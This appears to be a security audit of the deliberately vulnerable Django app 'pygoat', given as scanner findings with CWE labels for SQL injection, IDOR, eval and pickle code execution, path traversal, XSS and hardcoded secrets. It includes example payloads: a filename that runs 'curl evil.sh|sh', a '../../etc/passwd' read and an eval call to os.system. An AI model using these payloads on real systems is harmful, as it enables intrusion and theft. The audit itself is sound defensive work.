extra.message: User-controlled form['user_id'] is interpolated directly into a raw SQL string via Python % formatting and executed with User.objects.raw(). An attacker can break out of the quoted literal to inject arbitrary SQL (e.g. altering the WHERE/ORDER BY clause to select another user's row, as hinted by the adjacent comment). This is CWE-89 SQL Injection.

user_view is protected only by user_is_authenticated (validates a cookie exists) but the record being updated is selected using form['user_id'] taken from the POST body, not the authenticated user's own id. Any logged-in user can supply another user's id and modify that user's email/password/name. This is CWE-639 Insecure Direct Object Reference / Broken Access Control.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: The full User model __dict__ (including password hash and auth_token) is passed as the template context for account_settings.html. Any field accidentally referenced or introspected by the template leaks sensitive credentials. CWE-200 Exposure of Sensitive Information.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: hits_by_ip builds a raw SQL SELECT statement by directly formatting the caller-supplied 'ip' value and 'col' (column list) into the query string, then executes it with cursor.execute(). Both parameters are attacker controlled (see app/views/admin/views.py), allowing classic SQL injection via the ip value and arbitrary column/UNION injection via col. CWE-89.

admin_analytics builds the SQL column list ('col') straight from the names of arbitrary GET parameters supplied by the client and passes it unvalidated into Analytics.hits_by_ip, which concatenates it into a raw SQL SELECT ... FROM statement. An attacker can add GET parameters whose names are SQL fragments (e.g. UNION SELECT payloads) to exfiltrate arbitrary data. CWE-89.

All admin_* views (admin_dashboard, admin_get_user, admin_delete_user, admin_update_user, admin_get_all_users, admin_analytics) are guarded only by @user_is_authenticated, which merely checks that a valid auth_token cookie exists for ANY user (see app/decorators.py) — it never checks user.is_admin. Any authenticated, non-admin user can view/delete/update any account and view analytics data. CWE-862 Missing Authorization.

admin_update_user takes the entire POST body (minus password/password_confirmation) and applies it directly to the target user via .update(**data). Combined with the missing admin-authorization check above, any authenticated user can POST is_admin=True (or true-ish values Django will coerce) for their own or any other account, achieving privilege escalation. CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: user_work_info_index loads the target user directly from the user_id URL segment (User.objects.get(id=user_id)) instead of the authenticated current_user, with no ownership check. Any logged-in user can view any other employee's work_info, including plaintext SSN, by changing the numeric id in the URL. CWE-639 IDOR / CWE-200 Sensitive Data Exposure.

extra.message: user_pay handles DELETE by fetching the Pay record solely by the pay_id path parameter and deleting it, without verifying the record belongs to the authenticated current_user. Any authenticated user can delete another user's bank/payroll record by guessing/iterating pay_id. CWE-639 IDOR.

extra.message: user_message fetches Message.objects.get(pk=message_id) and allows viewing (GET) or deleting (DELETE) it without checking that current_user is the creator or receiver of the message. Any authenticated user can read or delete any other user's private messages by iterating message_id. CWE-639 IDOR.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: make_backup builds a shell command with os.system('cp %s %s' % (full_file_name, bak_file_path)) where full_file_name embeds the attacker-controlled uploaded file name (orig_file.name) unsanitized. A filename containing shell metacharacters (e.g. "a; curl evil.sh|sh #.pdf") is executed by the shell. CWE-78 OS Command Injection.

download() builds a filesystem path by concatenating BASE_DIR with the unsanitized GET parameter 'name' and opens/serves it. A request like ?name=../../../../etc/passwd (or an absolute path) lets an authenticated user read arbitrary files on the server, which are then returned as an attachment. CWE-22 Path Traversal.

save_data joins MEDIA_ROOT/data with the attacker-supplied uploaded_file.name without stripping path separators/'..' before storage, so a crafted filename can attempt to write outside the intended upload directory. CWE-22 Path Traversal.

reset_password calls pickle.loads(base64.b64decode(request.POST['user'])) on a value submitted by the client. Although the app generates this blob itself in confirm_token, it is round-tripped through an untrusted client (a hidden form field) with no integrity check (HMAC/signature), so an attacker can craft an arbitrary pickle payload to achieve remote code execution on deserialization. CWE-502 Insecure Deserialization.

confirm_token pickles the full User object (including the MD5 password hash and auth_token) and base64-encodes it into a hidden field rendered to the client. This both exposes sensitive fields to the browser and is the source of the untrusted data fed into pickle.loads() in reset_password. CWE-200 Exposure of Sensitive Information.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: generate_token derives the password-reset token solely from an unsalted MD5 hash of the (semi-public) user email plus their numeric user_id, with no server-side secret or expiry. Anyone who knows/guesses a user's email and small numeric user_id can compute a valid reset token themselves and take over the account. CWE-640 Weak Password Recovery Mechanism.

api_index takes the GET parameter 'class' and passes it directly to eval(classname). An unauthenticated request such as ?class=__import__('os').system('id') achieves arbitrary Python code execution on the server. No authentication is required to reach this endpoint. CWE-95 Eval Injection / Code Injection.

cwe: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

extra.message: api_id has the same unauthenticated eval(classname) sink as api_index, reachable via GET ?class=... on /api/v1/mobile/<id_number>. CWE-95 Eval Injection / Code Injection.

cwe: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

extra.message: check_if_valid_token authenticates mobile API requests using SHA(ACCESS_TOKEN_SALT + ':' + group_id) compared to a client-supplied hash, where ACCESS_TOKEN_SALT is a hardcoded constant in pygoat/settings.py. Anyone with access to the source (or who brute-forces the short static salt) can compute a valid Authorization token for an arbitrary user_id and fully bypass authentication for the /api/v1/mobile and /api/v1/users endpoints. CWE-287 Improper Authentication.

sessions_index reads 'path' directly from the POST body and, on successful login, redirects to it via HttpResponseRedirect(path) with no validation that it is a local/relative URL. An attacker can craft a login form pointing at an attacker-controlled absolute URL to redirect victims post-authentication (phishing). CWE-601 Open Redirect.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: safe_name() wraps the user-controlled first_name field (settable at signup with no HTML sanitization, see app/views/users/views.py index()) in mark_safe(), disabling Django's autoescaping. It is rendered directly with {{ current_user.safe_name }} in template/layouts/shared/nav_loggedin.html:23, which appears on every logged-in page. A user who signs up with first_name="<script>...</script>" achieves stored XSS against anyone viewing pages that render that navbar (e.g. an admin). CWE-79 Stored Cross-Site Scripting.

extra.message: hash_password() (and authenticate() at line 107) hash user passwords with unsalted MD5, a fast, broken hash unsuitable for password storage. A leaked database allows near-instant offline cracking via rainbow tables. CWE-327/CWE-916.

extra.message: generate_token() derives the session auth_token as MD5(email + random.randint(1,1000000)). Because the email is often known/guessable and the random component has only one million possible values, an attacker can brute-force a valid session token for a known user email offline. CWE-330 Use of Insufficiently Random Values.

extra.message: update_dd_info stores form['bankAccNumInput'] directly as Pay.bank_account_num. The model provides encrypt_bank_num()/decrypt_bank_num() (AES via app/models/utils.py) and a pre_save signal (app/signals.py) does invoke encrypt_bank_num before insert, but decrypt_bank_acct_num (line 43-46) subsequently looks up Pay by the plaintext account number the user submits, implying the value must remain matchable/plaintext-comparable and highlighting inconsistent handling of this sensitive financial field. extra.message: DEBUG = True and ALLOWED_HOSTS = ['*'] are committed to the settings module used to run the app. If deployed as-is, DEBUG=True leaks full stack traces, source snippets, and settings values (including SECRET_KEY) in error pages, and the wildcard ALLOWED_HOSTS disables Django's Host-header validation, enabling Host header attacks (cache poisoning, password-reset link poisoning). CWE-16 Configuration.

Django SECRET_KEY is a hardcoded literal committed to source control. This key backs session signing, CSRF tokens, and password-reset link signing; anyone with source access can forge signed cookies/tokens. CWE-798 Use of Hard-coded Credentials.

KEY, the AES key used by app/models/utils.py Encryption to encrypt SSNs and bank account numbers, is a hardcoded literal in settings.py. Anyone with source/repo access can decrypt every SSN and bank account number in the database. CWE-798 Use of Hard-coded Credentials.

ACCESS_TOKEN_SALT, the only secret protecting the mobile/API authentication scheme in app/views/api/users/views.py, is a hardcoded literal in source. See the linked CWE-287 finding for the resulting full authentication bypass. CWE-798 Use of Hard-coded Credentials.
Database credentials (root / password) for the MySQL backend are hardcoded in the docker settings module. CWE-798 Use of Hard-coded Credentials.
